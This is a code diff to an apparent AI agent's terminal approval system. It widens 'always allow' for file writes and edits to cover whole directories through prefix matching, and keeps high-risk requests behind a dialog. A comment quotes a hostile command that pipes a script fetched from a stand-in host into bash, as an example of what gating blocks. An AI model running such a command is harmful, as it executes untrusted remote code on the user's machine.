@@ -63,6 +63,12 @@ function generateApprovalPattern(request: TypesApprovalRequest): string {
 
   if (['write_file', 'edit_file', 'read_file'].includes(tool)) {
     const path = (args.path || args.file_path || '') as string;
+    // For write/edit: use directory-level patterns so "Always" covers the whole subtree
+    // e.g. write_file:src/api/ instead of write_file:src/api/routes.ts
+    if ((tool === 'write_file' || tool === 'edit_file') && path.includes('/')) {
+      const dir = path.substring(0, path.lastIndexOf('/') + 1);
+      return `${tool}:${dir}`;
+    }
     return `${tool}:${path}`;
   }
 
@@ -650,7 +656,12 @@ export function TUIApp({
     const pattern = generateApprovalPattern(request);
     // Only auto-approve low/moderate risk — high/critical always show dialog
     // This prevents e.g. approving "bash:echo" from auto-approving "echo $(curl evil.sh) | bash"
-    if (alwaysAllowed.has(pattern) && (request.risk === 'low' || request.risk === 'moderate')) {
+    const isAllowed = (request.risk === 'low' || request.risk === 'moderate') && (
+      alwaysAllowed.has(pattern) ||
+      // Prefix match: if we allowed write_file:src/api/, also allow write_file:src/api/sub/file.ts
+      [...alwaysAllowed].some(p => pattern.startsWith(p) && p.endsWith('/'))
+    );
+    if (isAllowed) {
       // Auto-approve without showing dialog
       approvalBridge?.resolve({ approved: true });
       return;
